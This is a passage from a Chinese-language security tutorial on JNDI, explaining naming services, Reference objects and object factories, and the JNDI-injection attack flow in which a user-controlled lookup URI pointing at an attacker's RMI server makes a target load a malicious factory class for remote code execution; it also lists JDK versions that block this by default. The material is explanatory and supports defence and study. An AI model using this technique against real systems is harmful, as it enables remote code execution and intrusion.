0x02 JNDI简介

​ I代表Interface，是一种接口，是一种统一的API。服务器端叫做服务供应接口（SPI），管理者将JNDI API映射为特定的命名服务和目录系统，实现交互。类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。
​ 使用它可以与不同的Naming Service和Directory Service进行交互。比如RMI,LDAP,Active Directory,DNS,CORBA。其中Naming Service是对象和名称绑定在一起，然后通过名称去查找相应的对象。而Directory Service是一种特殊的Naming Service，它允许储存和查找Directory对象，Directory对象和一般的对象不同在于它可以将属性和对象相关联。

​ 简单理解：服务器端将这个索引库的接口实现，通过指定的名称找到对应的对象。动态加载数据库配置文件来解耦合。

0、 好处

①、 jndi自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，然后在这个其他应用上再去区分客户端和服务器端。客户端主要是各种访问、查询、搜索，服务器端主要是进行帮助管理配置（bind）。虽然rmi服务器上可以不直接使用Register.bind()，虽然底层还是这么是实现的，但是表面是jndi统一管理，所以第一个好处就是统一地配置接口。

②、类似的url形式来访问目标服务 ，也就是jndi动态协议转换。

③、在下图的jndi分层结构中，对SPI层和Naming Manager层，JVM在验证从何处加载远程类时的行为时不同。也就是说，JVM对于远程加载类有两种不同的安全级别，分别时SPI级别和Naming Manager级别。SPI级别中如果JVM允许从远程加载类，需要根据不同的服务提供者（RMI、LDAP、CORBA）来决定是否强制安装Security Manager安全管理器。具体条件：

但是Naming Manager层放宽了安全限制。解码JNDI命名引用时，始终允许从外部代码库加载类，没有JMVM选项禁用它。所以并不需要强制安装任何安全管理器，这样攻击者可以利用特定的情况来远程执行自己的代码。

3、JNDI命名引用-Reference类

​ 为了在命名服务或目录服务中绑定Java对象，可以使用Java序列化来传输对象，但有时候不太合适，比如Java对象较大的情况。因此JNDI定义了命名引用(Naming References)，后面直接简称引用(References)。通过绑定一个引用，将对象存储到命名服务或目录服务中，命名管理器(Naming Manager)可以将引用解析为关联的原始对象。

JNDI和Object Factory之间的关系

​ jndi触发payload的过程：lookup方法中调用了decodeObject方法，又进入到NamingManager.getObjectInstance方法（Naming Manager属于jndi第二层结构）

关键：在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。

整个利用流程如下：

  1. 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；
  2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；
  3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
  4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；
  5. 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；

在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。

另外，要注意的是，针对JNDI注入，后续的JDK版本，对于RMI/LDAP两个攻击向量而言，也做了默认情况的限制：

  • com.sun.jndi.ldap.object.trustURLCodebase 属性在 Oracle JDK 11.0.1, 8u191, 7u201, and 6u211及以后的版本，默认值为false，即不允许LDAP从远程地址加载Reference工厂类。
  • com.sun.jndi.rmi.object.trustURLCodebase 属性在 Oracle JDK 8u113, 7u122, 6u132及以后的版本，默认值为false，即默认不允许RMI从远程地址加载Reference工厂类。
